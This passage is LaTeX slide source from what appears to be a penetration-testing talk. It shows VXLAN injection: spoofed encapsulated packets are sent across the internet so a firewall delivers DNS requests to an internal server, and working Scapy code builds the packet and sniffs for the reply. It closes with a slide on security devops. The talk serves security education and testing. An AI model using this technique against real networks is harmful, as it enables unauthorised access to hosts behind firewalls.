%\item Select target: internal server, 10.0.0.10 and DNS service 53/UDP
%\item Create VXLAN packet(s): DNS request dst 10.0.0.10 UDP dport 53
%\item Source for this probe is your external pentest server
%\item Make sure inside packet has Ethernet destination that reaches server
%\item Send spoofed VXLAN packet across internet
%\item After VXLAN decap this packet is sent to the server
%\item Server process DNS request, send back response
%\item Attacker waiting for the UDP DNS reply, gets it
%\end{enumerate}

{\footnotesize Attacker can send UDP DNS request to inside server on RFC1918 destination\\
Note: server has no external IP or incoming ports forwarded.\\
Tested working with Clavister with DNS UDP probes/requests, no inspection }


\slide{Snippets of Scapy}

First create VXLAN header and inside packet
\begin{minted}[fontsize=\small]{python}
vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
vni=37             # Usually VNI == destination VLAN
vxlan=Ether(dst=routermac)/IP(src=vtepsrc,dst=vtepdst)/
   UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vni,flags="Instance")
broadcastmac="ff:ff:ff:ff:ff:ff"
randommac="00:51:52:01:02:03"
attacker="185.27.115.666"
destination="10.0.0.10"
# port is the one we want to contact inside the firewall
insideport=53
testport=54040
packet=vxlan/Ether(dst=broadcastmac,src=randommac)/IP(src=attacker,
    dst=destination)/UDP(sport=testport,dport=insideport)/
    DNS(rd=1,id=0xdead,qd=DNSQR(qname="www.wikipedia.org"))
\end{minted}

{\footnotesize Fun fact, Unbound on OpenBSD reply to DNS requests received in Ethernet packets with broadcast destination and IP destination being the IP of the server}



\slide{Send and receive - from another source}

Send and then wait for something, not from same IP bc from\\
inside NAT, but port should be OK
\begin{minted}[fontsize=\small]{python}
pid = os.fork()
if pid:
    print "parent: setting up sniffing"
    # Wait for UDP packet
    data = sniff(filter="udp and port 54040 and net 192.0.2.0/24", count=1)
else:
    time.sleep(10)
    print "child: sending packet"
    sendp(packet,loop=0)
    print "child: closing"
    sys.exit(0)
data[0].show()
\end{minted}

Source port in the inside request packet, becomes the destination port in replies from the server - 54040


\slide{Security devops}

\begin{list1}
\item We need devops skillz in security
\item automate, security is also big data
\item integrate tools, transfer, sort, search, pattern matching, statistics, ...
\item tools, languages, databases, protocols, data formats
\item Use Github! Der er så mange biblioteker og programmer, noget eksisterende løser måske dit problem 90%
\item Example introductions:
\begin{list2}
\item Seven languages/database/web frameworks in Seven Weeks
\item Elasticsearch the definitive guide
\end{list2}
\end{list1}

\centerline{We are all Devops now, even security people!}


\myquestionspage

\end{document}
